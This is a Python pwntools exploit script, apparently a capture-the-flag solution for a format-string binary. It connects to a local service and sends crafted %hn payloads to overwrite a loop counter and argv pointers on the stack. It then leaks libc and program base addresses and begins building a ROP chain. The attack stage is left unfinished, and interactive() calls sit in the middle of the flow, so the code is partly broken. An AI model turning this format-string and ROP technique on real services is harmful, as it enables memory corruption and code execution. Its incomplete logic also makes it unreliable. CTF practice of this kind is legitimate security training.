# -*- coding: utf-8 -*- 
from pwn import *


#file decripter
#0  Standard input  stdin
#1  Standard output stdout
#2  Standard error  stderr

#
#   Arch:     amd64-64-little
#   RELRO:    Full RELRO
#   Stack:    No canary found
#   NX:       NX enabled
#   PIE:      PIE enabled
#   FORTIFY:  Enabled


buf_off = 0x201020
libc_off = 0x20830      #an address which pushed in __libc_start_main, is an addr in libc.
stack_off = 0x206d0     #an address in stack.(main frame)

r = remote('127.0.0.1',8888)
#r = remote('csie.ctf.tw',10132)

#main stack 往上算第三個是&argv
#0x7fffffffe5f8     -> 0x7fffffffe6c8 : &argv
#0x7fffffffe6c8     -> 0x7fffffffe8d8 : &argv[0] :./fmtfun4u
#0x7fffffffe6c8+0x8 -> 0x7fffffffe8f3 : &argv[1] :fuck

def fmt(pre,val,idx):
    padding_char_len = (val - pre) if val >  pre else (val - pre + 65536) 
    result = '%' + str(padding_char_len) + 'c%' + str(idx) + '$hn' 
    return result
def fmt_hhn(pre,val,idx):
    padding_char_len = (val - pre) if val >  pre else (val - pre + 256) 
    result = '%' + str(padding_char_len) + 'c%' + str(idx) + '$hhn' 
    return result
def change_lower_argv(off):
    #change &argv[0] lower 32 bit
    pay = fmt(0,off,11)
    #pay = '%' + str(off) + 'c%11$hn'
    if off == 0:
        pay = '%11$hn'
    r.sendline(pay)
    r.recvuntil(':')
def set_i():
    #set i to 10000 
    r.recvuntil(':')
    r.interactive()
    r.send('argv:%11$p,%37$p')
    r.recvuntil('argv:')
    
    argv,argv0 = r.recvline().strip().split(',')
    argv = int( argv.ljust(8,'\0') ,0)
    argv0 = int( argv0.ljust(8,'\0') ,0)
    print '%s' % hex(argv)
    print '%s' % hex(argv0)
    r.recvuntil(':')
    #make $37 point to &i at $6
    i_addr = (argv % 0x10000) - 0xec
    pay = fmt(0,i_addr,11)
    r.send(pay.ljust(16,'\0'))
    r.recvuntil(':')
    sleep(0.1)
    #change i to 1000
    pay = fmt(0,10000,37)
    r.send(pay.ljust(16,'\0'))
    r.recvuntil(':')
    
    return argv,argv0
def set_higher_pointer(argv):
    #make $12/$13/$14 point to higher 2/4/6 byte of &argv[0].
    #make it easier to access memory with given address.
    print hex(argv - 0xc8)
    for j in range(3):
        for i in range(4):
            off = (argv-0xc8+(j*8)+(i*2)) & 0xffff
            change_lower_argv(off)
            val = ( (argv + 0x2*(j+1) ) >> (i*16) ) & 0xffff
            print hex(off),hex(val)
            pay = fmt(0,val,37)
            r.send(pay)
            r.recvuntil(':')
    #
    clean_pipe()


def change_argv(addr):
    #each time wite hn, 4 bytes, to argv[0] 
    for i in range(4):
        idx = 11+i
        val = (addr >> (i*16) ) & 0xffff 
        pay = fmt(0,val,idx)
        r.sendline(pay)
        r.recvuntil(':')

def leak_libc_base():
    r.send('%9$p')
    r.recvuntil('0x')
    ret_libc = int( r.recv(12).ljust(8,'\0') ,16)
    libc = ret_libc - libc_off
    return libc 
def leak_text_base():
    r.send('%8$p')
    r.recvuntil('0x')
    text_off = 0xa80 
    rbp_libc = int( r.recv(12).ljust(8,'\0') ,16)
    text_base = rbp_libc - text_off
    return text_base 

def clean_pipe():
    sleep(0.1)
    r.recv(timeout = 0.01)
argv,argv0 = set_i()
set_higher_pointer(argv)
r.interactive()
libc = leak_libc_base()
text = leak_text_base()

buf_off = 0x201600
buf_addr = text + buf_off

print 'libc base : %s\ntext base : %s' % (hex(libc),hex(text))

pop_rdi_off = 0x21102
leave_off = 0x9af
pop_rdi_addr = libc + pop_rdi_off
leave_addr = text + leave_off

#clean_pipe()
#r.interactive()
'''
write_rop(pop_rdi_addr)
write_rop(0x123456)

write_rop(leave_addr)

'''

r.interactive()








